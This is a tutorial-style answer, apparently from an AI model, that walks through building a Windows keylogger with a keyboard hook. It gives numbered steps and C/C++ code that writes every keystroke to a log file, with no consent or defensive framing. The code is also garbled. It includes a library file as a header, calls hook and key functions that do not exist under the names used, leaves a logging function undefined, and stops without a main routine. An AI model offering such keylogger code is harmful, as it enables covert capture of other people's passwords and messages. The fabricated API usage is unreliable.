To create a keyboard hook in Windows that logs keystrokes, follow these steps:

1. **Include Necessary Headers and Libraries**:
   - Include `windows.h` and `user32.lib` for Windows API functions.

2. **Define the Callback Function**:
   - Create a function that handles key events, logging the key presses.

3. **Initialize the Keyboard Hook**:
   - Use `SetWindowsHook` to set up the hook with `WH_KEYBOARD` event types.

4. **Set Up the Hook**:
   - Install the hook and specify the callback function and window.

5. **Log Key Events**:
   - In the callback, check if the key is pressed or released and record the key and modifiers.

6. **Handle Key Processing**:
   - Use `MakeWord` to translate raw key numbers to characters and determine modifiers.

7. **Manage Hook Termination**:
   - Use `UnsetWindowsHook` to stop the hook and clean up resources.

**Code Example**:

```c
#include <windows.h>
#include <user32.lib>
#include <stdio.h>
#include <iostream>
#include <ctime>

using namespace std;

#define HOOK_PRIORITY 0
#define FILE_NAME "keyboard_log.txt"

// Function prototypes
void KeyPressed(int nFirstKey, int nSecondKey, int state);
void HandleKeyboardEvent(UINT uMsg, WPARAM wParam, LPARAM lParam);
void InitializeKeyboardHook();
void CleanupKeyboardHook();
void WriteLogToFile(const string& logLine);

// Global variables
HHOOK hKeyboardHook = NULL;
FILE *logFile;
string currentKey;
int lastKey = 0;
bool isShift = false;
bool isCtrl = false;
bool isAlt = false;

// Initialize the log file
void InitializeLogFile() {
    logFile = fopen(FILE_NAME, "a");
    if (!logFile) {
        printf("Failed to initialize log file!\n");
        return;
    }
}

// Callback function for keyboard events
void KeyPressed(int nFirstKey, int nSecondKey, int state) {
    // Handle key presses
    if (nFirstKey != 0) {
        char key = static_cast<char>(MakeWord(nFirstKey, nSecondKey));
        // Determine if the key is a modifier
        if (nFirstKey == 0x20 || nFirstKey == 0x11 || nFirstKey == 0x12 || nFirstKey == 0x10) {
            // Modifier keys
            if (nSecondKey == 0x1) {
                isShift = state;
            } else if (nSecondKey == 0x2) {
                isCtrl = state;
            } else if (nSecondKey == 0x4) {
                isAlt = state;
            }
        } else {
            currentKey = key;
            lastKey = nFirstKey;
            // Record the key
            WriteLogToFile(currentKey);
        }
    }
}

void HandleKeyboardEvent(UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (lParam == 0) {
        // Handle key events
        KeyPressed(GET_KEYUP(uMsg, wParam), GET_KEYDOWN(uMsg, wParam), wParam);
    }
}

void InitializeKeyboardHook() {
    InitializeLogFile();
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD, HandleKeyboardEvent);
    if (!hKeyboardHook) {
        printf("Failed to set keyboard hook!\n");
    }
}

void CleanupKeyboardHook() {
    if (logFile) {
        fclose(logFile);
    }
    if (hKeyboardHook) {
        UnsetWindowsHook(hKeyboardHook);
        hKeyboardHook = NULL;
    }
}

